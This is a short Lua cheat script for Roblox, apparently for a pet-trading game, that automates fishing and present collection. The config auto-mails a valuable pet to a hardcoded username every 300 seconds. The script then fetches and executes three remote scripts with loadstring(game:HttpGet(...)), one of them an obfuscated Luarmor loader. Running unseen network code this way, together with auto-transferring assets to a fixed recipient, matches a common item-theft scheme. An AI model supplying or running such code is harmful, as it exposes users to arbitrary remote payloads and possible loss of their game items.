task.spawn(function()
    getgenv().config = {                 
        autoFishing = true,              -- farm off execution or not
        placetoFish = "AdvancedFishing", -- "Fishing" // "AdvancedFishing"
        invisWater = true,                  -- make water transparent
        renderer = false,                  -- auto derenderer
        autoPresents = false,              -- auto collect presents
    
        autoMail = true,                  -- true // false
        autoMailUsers = {                 
            "maxime1940",                 -- Usernames to auto mail
        },
        autoMailItem = "Huge Poseidon Corgi",                 -- "ALL" // "Magic Shards" // "Huge Poseidon Corgi"
        sendGems = true,                  -- auto send all gems ONLY FOR autoMail "ALL"
        autoMailAmount = 0,              -- amount to auto mail (only works for shards)
        autoMailTimer = 300,              -- custom timer (seconds)
    
        manualMailUsers = {
            "",                 -- Usernames to manual mail
            "",                 -- can add as many as you want
        },
        manualMailItem = "",             -- "Magic Shards" // "Huge Poseidon Corgi"
        manualMailAmount = 0,              -- amount to manually mail
    }
    loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/44b68947f7e7829ffaa9421616cd752e.lua"))()
end)
task.spawn(function()
    task.wait(10)
    loadstring(game:HttpGet("https://raw.githubusercontent.com/lenutjr/lenut/main/scripts"))()
end)

task.spawn(function()
    task.wait(40)
    loadstring(game:HttpGet("https://raw.githubusercontent.com/darzex/script/main/low-cpu.lua"))()
end)
